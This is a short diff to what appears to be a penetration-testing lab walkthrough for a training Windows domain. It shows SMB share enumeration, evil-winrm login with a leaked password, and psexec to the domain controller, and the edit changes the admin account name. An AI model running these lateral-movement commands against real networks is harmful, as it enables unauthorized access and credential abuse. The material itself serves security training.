@@ -12,7 +12,7 @@
 smbclient -N //<files01>/share -c 'recurse;ls'
 evil-winrm -i <ws01> -u 'corp\wuser' -p '<leaked>'
 # on ws01: look for ops notes — they always mention the DC admin
-impacket-psexec corp.pentrain.local/Administrator:'<pw>'@<dc01>
+impacket-psexec corp.pentrain.local/adm-ops:'<pw>'@<dc01>
 ```
 
 ## Concepts
